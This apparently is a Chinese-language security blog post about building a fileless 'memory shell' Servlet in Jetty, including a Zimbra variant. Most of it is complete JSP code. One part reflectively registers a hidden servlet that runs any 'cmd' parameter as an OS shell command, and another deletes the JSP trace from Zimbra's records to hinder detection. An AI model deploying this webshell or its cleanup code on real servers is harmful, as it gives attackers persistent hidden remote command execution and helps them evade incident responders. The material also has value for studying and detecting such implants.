---
layout: post
title: Java利用技巧——Jetty Servlet型内存马
---


## 0x00 前言
---

在上篇文章介绍了Jetty Filter型内存马的实现思路和细节，本文介绍Jetty Servlet型内存马的实现思路和细节

## 0x01 简介
---

本文将要介绍以下内容：

- 实现思路
- 实现代码
- Zimbra环境下的Servlet型内存马

## 0x02 实现思路
---

同样是使用Thread获得webappclassloaer，进而通过反射调用相关方法添加Servlet型内存马

## 0x03 实现代码
---

### 1.添加Servlet

Jetty下可用的完整代码如下：

```
<%@ page import="java.lang.reflect.Field"%>
<%@ page import="java.lang.reflect.Method"%>
<%@ page import="java.util.Scanner"%>
<%@ page import="java.io.*"%>
<%
    String servletName = "myServlet";
    String urlPattern = "/servlet";
    Servlet servlet = new Servlet() {
        @Override
        public void init(ServletConfig servletConfig) throws ServletException {
        }
        @Override
        public ServletConfig getServletConfig() {
            return null;
        }
        @Override
        public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
            HttpServletRequest req = (HttpServletRequest) servletRequest;
            if (req.getParameter("cmd") != null) {
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[] {"sh", "-c", req.getParameter("cmd")} : new String[] {"cmd.exe", "/c", req.getParameter("cmd")};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner( in ).useDelimiter("\\a");
                String output = s.hasNext() ? s.next() : "";
                servletResponse.getWriter().write(output);
                servletResponse.getWriter().flush();
                return;
            }
        }
        @Override
        public String getServletInfo() {
            return null;
        }
        @Override
        public void destroy() {
        }
    };
    Method threadMethod = Class.forName("java.lang.Thread").getDeclaredMethod("getThreads");
    threadMethod.setAccessible(true);
    Thread[] threads = (Thread[]) threadMethod.invoke(null);
    ClassLoader threadClassLoader = null;
    for (Thread thread : threads)
    {
        threadClassLoader = thread.getContextClassLoader();
        if(threadClassLoader != null){
            if(threadClassLoader.toString().contains("WebAppClassLoader")){
                Field fieldContext = threadClassLoader.getClass().getDeclaredField("_context");
                fieldContext.setAccessible(true);
                Object webAppContext = fieldContext.get(threadClassLoader);
                Field fieldServletHandler = webAppContext.getClass().getSuperclass().getDeclaredField("_servletHandler");
                fieldServletHandler.setAccessible(true);
                Object servletHandler = fieldServletHandler.get(webAppContext);
                Field fieldServlets = servletHandler.getClass().getDeclaredField("_servlets");
                fieldServlets.setAccessible(true);
                Object[] servlets = (Object[]) fieldServlets.get(servletHandler);
                boolean flag = false;
                for(Object s:servlets){
                    Field fieldName = s.getClass().getSuperclass().getDeclaredField("_name");
                    fieldName.setAccessible(true);
                    String name = (String) fieldName.get(s);
                    if(name.equals(servletName)){
                        flag = true;
                        break;
                    }
                }
                if(flag){
                    out.println("[-] Servlet " + servletName + " exists.<br>");
                    return;
                }
                out.println("[+] Add Servlet: " + servletName + "<br>");
                out.println("[+] urlPattern: " + urlPattern + "<br>");
                ClassLoader classLoader = servletHandler.getClass().getClassLoader();
                Class sourceClazz = null;
                Object holder = null;
                Field field = null;
                try{
                    sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.Source");
                    field = sourceClazz.getDeclaredField("JAVAX_API");
                    Method method = servletHandler.getClass().getMethod("newServletHolder", sourceClazz);
                    holder = method.invoke(servletHandler, field.get(null));
                }catch(ClassNotFoundException e){
                    sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.BaseHolder$Source");
                    Method method = servletHandler.getClass().getMethod("newServletHolder", sourceClazz);
                    holder = method.invoke(servletHandler, Enum.valueOf(sourceClazz, "JAVAX_API"));
                }
                holder.getClass().getMethod("setName", String.class).invoke(holder, servletName);
                holder.getClass().getMethod("setServlet", Servlet.class).invoke(holder, servlet);
                servletHandler.getClass().getMethod("addServlet", holder.getClass()).invoke(servletHandler, holder);
                Class clazz = classLoader.loadClass("org.eclipse.jetty.servlet.ServletMapping");
                Object servletMapping = null;
                try{
                    servletMapping = clazz.getDeclaredConstructor(sourceClazz).newInstance(field.get(null));
                }catch(NoSuchMethodException e){
                    servletMapping = clazz.newInstance();
                }
                servletMapping.getClass().getMethod("setServletName", String.class).invoke(servletMapping, servletName);
                servletMapping.getClass().getMethod("setPathSpecs", String[].class).invoke(servletMapping, new Object[]{new String[]{urlPattern}});
                servletHandler.getClass().getMethod("addServletMapping", clazz).invoke(servletHandler, servletMapping);
            }     
        }
    }
%>
```

### 2.枚举Servlet

#### (1)通过request对象调用getServletRegistrations枚举Servlet

Jetty下可用的完整代码如下：

```
<%@ page import="java.lang.reflect.Method "%>
<%
    ServletContext servletContext = request.getServletContext();
    Method m1 = servletContext.getClass().getSuperclass().getDeclaredMethod("getServletRegistrations");
    Object obj1 = m1.invoke(servletContext);
    out.println(obj1); 
%>
```

对应命令为：`request.getSession().getServletContext().getClass().getSuperclass().getDeclaredMethod("getServletRegistrations").invoke(request.getSession().getServletContext())`

#### (2)通过Thread获得webappclassloaer，通过反射读取_servlets属性来枚举Servlet

Jetty下可用的完整代码如下：

```
<%@ page import="java.lang.reflect.Field"%>
<%@ page import="java.lang.reflect.Method"%>
<%
    Method threadMethod = Class.forName("java.lang.Thread").getDeclaredMethod("getThreads");
    threadMethod.setAccessible(true);
    Thread[] threads = (Thread[]) threadMethod.invoke(null);
    ClassLoader threadClassLoader = null;

    for (Thread thread:threads)
    {
        threadClassLoader = thread.getContextClassLoader();
        if(threadClassLoader != null){
            if(threadClassLoader.toString().contains("WebAppClassLoader")){
                Field fieldContext = threadClassLoader.getClass().getDeclaredField("_context");
                fieldContext.setAccessible(true);
                Object webAppContext = fieldContext.get(threadClassLoader);
                Field fieldServletHandler = webAppContext.getClass().getSuperclass().getDeclaredField("_servletHandler");
                fieldServletHandler.setAccessible(true);
                Object servletHandler = fieldServletHandler.get(webAppContext);
                Field fieldServlets = servletHandler.getClass().getDeclaredField("_servlets");
                fieldServlets.setAccessible(true);
                Object[] servlets = (Object[]) fieldServlets.get(servletHandler);
                boolean flag = false;
                for(Object servlet:servlets){
                    out.print(servlet + "<br>");
                }
            }     
        }
    }
%>
```

**注：**

该方法在Zimbra环境下会存在多个重复结果

## 0x04 Zimbra环境下的Servlet型内存马
---

Zimbra存在多个名为WebAppClassLoader的线程，所以在添加Servlet时需要修改判断条件，避免提前退出，在实例代码的基础上直接修改即可

在Zimbra环境下测试还需要注意一个问题：在`rctxt`->`jsps`下会标记所有执行过的jsp实例，测试代码如下：

```
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.util.concurrent.ConcurrentHashMap" %>
<%@ page import="java.util.*" %>
<%   
    Field f = request.getClass().getDeclaredField("_scope");
    f.setAccessible(true);
    Object conn1 = f.get(request);
    f = conn1.getClass().getDeclaredField("_servlet");
    f.setAccessible(true);
    Object conn2 = f.get(conn1);
    f = conn2.getClass().getSuperclass().getDeclaredField("rctxt");
    f.setAccessible(true);
    Object conn3 = f.get(conn2);
    f = conn3.getClass().getDeclaredField("jsps");
    f.setAccessible(true);
    ConcurrentHashMap conn4 = (ConcurrentHashMap)f.get(conn3);  
    Enumeration enu = conn4.keys(); 
    while (enu.hasMoreElements()) { 
        out.println(enu.nextElement() + "<br>"); 
    }  
%>
```

当然，我们可以通过反射删除内存马对应的jsp实例，测试代码如下：

```
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.util.concurrent.ConcurrentHashMap" %>
<%@ page import="java.util.*" %>
<%
        
    Field f = request.getClass().getDeclaredField("_scope");
    f.setAccessible(true);
    Object conn1 = f.get(request);
    f = conn1.getClass().getDeclaredField("_servlet");
    f.setAccessible(true);
    Object conn2 = f.get(conn1);
    f = conn2.getClass().getSuperclass().getDeclaredField("rctxt");
    f.setAccessible(true);
    Object conn3 = f.get(conn2);
    f = conn3.getClass().getDeclaredField("jsps");
    f.setAccessible(true);    
    ConcurrentHashMap conn4 = (ConcurrentHashMap)f.get(conn3);  
    conn4.remove("/myServlet.jsp");
%>
```

无论是Filter型内存马还是Servlet型内存马，删除内存马对应的jsp实例不影响内存马的正常使用

## 0x05 利用思路
---

同Filter型内存马一样，Servlet型内存马的优点是不需要写入文件，但是会在服务重启时失效

## 0x06 小结
---

本文介绍了Jetty Servlet型内存马的实现思路和细节，给出了可供测试的代码，分享了Zimbra环境的利用方法。


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)
